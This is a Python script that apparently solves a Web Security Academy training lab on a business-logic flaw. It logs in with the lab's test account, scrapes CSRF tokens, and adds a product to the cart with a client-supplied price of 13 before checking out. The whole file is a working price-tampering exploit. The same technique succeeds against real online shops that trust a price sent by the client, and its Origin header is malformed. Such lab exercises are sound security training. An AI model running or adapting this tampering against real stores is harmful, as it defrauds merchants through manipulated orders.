import requests

DOMAIN = "0aa000c7043f4bd181b87525000300be.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https:/{DOMAIN}",
    "Connection": "close",
    "Referer": f"https://{DOMAIN}/login",
    "Upgrade-Insecure-Requests": "1",
    "Cookie": ""
}


def get_csrf_token():
    url = f"https://{DOMAIN}/login"
    response = requests.get(url, headers=HEADERS)

    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]

    HEADERS["Cookie"] = "session=" + response.cookies["session"] + ";"

    return csrf_token

def login():
    csrf_token = get_csrf_token()
    url = f"https://{DOMAIN}/login"
    data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }

    response = requests.post(url, headers=HEADERS, data=data, allow_redirects=False)

    if response.status_code == 302:
        print("Login successful")
        print(response.headers["Set-Cookie"])

    HEADERS["Cookie"] = "session=" + response.headers["Set-Cookie"].split("session=")[1].split(";")[0] + ";"

def add_to_cart():
    url = f"https://{DOMAIN}/cart"
    data = {
        "productId": "1",
        "redir": "PRODUCT",
        "quantity": "1",
        "price": "13"
    }
    response = requests.post(url, headers=HEADERS, data=data)



def get_cart():
    url = f"https://{DOMAIN}/cart"
    response = requests.get(url, headers=HEADERS)

def get_csrf_token_cart():
    url = f"https://{DOMAIN}/cart"
    response = requests.get(url, headers=HEADERS)
    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]
    return csrf_token

def checkout():
    url = f"https://{DOMAIN}/cart/checkout"
    data = {
        "csrf": get_csrf_token_cart(),
    }

    response = requests.post(url, headers=HEADERS, data=data)

    print(response.headers)
    if "Your order is on its way!" in response.text:
        print("Order successful")

login()
add_to_cart()
get_cart()
checkout()